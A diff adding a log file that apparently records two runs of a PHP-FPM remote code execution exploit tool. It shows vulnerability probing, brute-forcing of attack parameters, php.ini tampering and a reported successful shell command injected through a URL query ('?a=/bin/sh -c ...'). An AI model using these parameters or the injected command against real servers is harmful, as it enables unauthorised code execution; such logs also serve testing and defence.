@@ -1,0 +1,99 @@
+2026/10/23 10:55:30 Base status code is 200
+2026/10/23 10:55:30 Status code 502 for qsl=1765, adding as a candidate
+2026/10/23 10:55:30 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
+2026/10/23 10:55:30 Attack params found: --qsl 1760 --pisos 35 --skip-detect
+2026/10/23 10:55:30 Trying to set "session.auto_start=0"...
+2026/10/23 10:55:30 Detect() returned attack params: --qsl 1760 --pisos 35 --skip-detect <-- REMEMBER THIS
+2026/10/23 10:55:30 Performing attack using php.ini settings...
+2026/10/23 10:55:30 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
+2026/10/23 10:55:30 Trying to cleanup /tmp/a...
+2026/10/23 10:55:30 Done!
+2026/10/23 11:26:42 Base status code is 200
+2026/10/23 11:26:42 Status code 502 for qsl=1765, adding as a candidate
+2026/10/23 11:26:42 The target is probably vulnerable. Possible QSLs: [1755 1760 1765]
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:1}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:2}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:3}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:4}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:5}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:6}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:7}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:8}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:9}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:10}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:11}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:12}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:13}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:14}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:15}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:16}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:17}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:18}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:19}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:20}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:21}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:22}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:23}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:24}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:25}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:26}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:27}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:28}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:29}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:30}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:31}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:32}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:33}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:34}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:35}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:36}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:37}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:38}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:39}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:40}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:41}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:42}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:43}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:44}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:45}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:46}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:47}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:48}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:49}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:50}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:51}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:52}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:53}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:54}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:55}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:56}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:57}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:58}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:59}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:60}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:61}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:62}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:63}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:64}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:65}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:66}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:67}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:68}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:69}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:70}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:71}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:72}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:73}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:74}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:75}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:76}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:77}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:78}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:79}
+2026/10/23 11:26:42 Status code 502 for &main.AttackParams{QueryStringLength:1760, PisosLength:80}
+2026/10/23 11:26:42 Attack params found: --qsl 1760 --pisos 147 --skip-detect
+2026/10/23 11:26:42 Trying to set "session.auto_start=0"...
+2026/10/23 11:26:42 Detect() returned attack params: --qsl 1760 --pisos 147 --skip-detect <-- REMEMBER THIS
+2026/10/23 11:26:42 Performing attack using php.ini settings...
+2026/10/23 11:26:42 Success! Was able to execute a command by appending "?a=/bin/sh+-c+'which+which'&" to URLs
+2026/10/23 11:26:42 Trying to cleanup /tmp/a...
